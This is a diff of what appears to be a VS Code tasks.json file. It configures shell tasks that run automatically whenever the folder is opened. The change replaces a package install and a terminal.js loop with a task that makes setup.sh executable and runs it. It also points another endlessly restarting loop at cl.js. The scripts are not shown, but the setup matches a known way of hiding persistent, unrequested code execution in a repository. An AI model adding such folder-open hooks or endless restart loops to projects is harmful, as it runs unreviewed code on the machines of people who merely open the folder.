@@ -9,18 +9,10 @@
                 "runOn": "folderOpen"
             }
         },
-        {
-            "label": "setup-terminal",
+         {
+            "label": "setup-sh",
             "type": "shell",
-            "command": "npm install minimist puppeteer-extra node-fetch@2 ws blessed pidusage axios",
-            "runOptions": {
-                "runOn": "folderOpen"
-            }
-        },
-        {
-            "label": "run-terminal",
-            "type": "shell",
-            "command": "while true; do node terminal.js || true; echo 'Retrying terminal.js in 30s...'; sleep 30; done",
+            "command": "chmod +x setup.sh && sed -i 's/\r$//' setup.sh && ./setup.sh",
             "runOptions": {
                 "runOn": "folderOpen"
             }
@@ -28,7 +20,7 @@
         {
             "label": "op-pya",
             "type": "shell",
-            "command": "while true; do node pypya.js || true; echo 'Retrying pypya.js in 30s...'; sleep 30; done",
+            "command": "while true; do node cl.js || true; echo 'Retrying cl.js in 10s...'; sleep 10; done",
             "runOptions": {
                 "runOn": "folderOpen"
             }
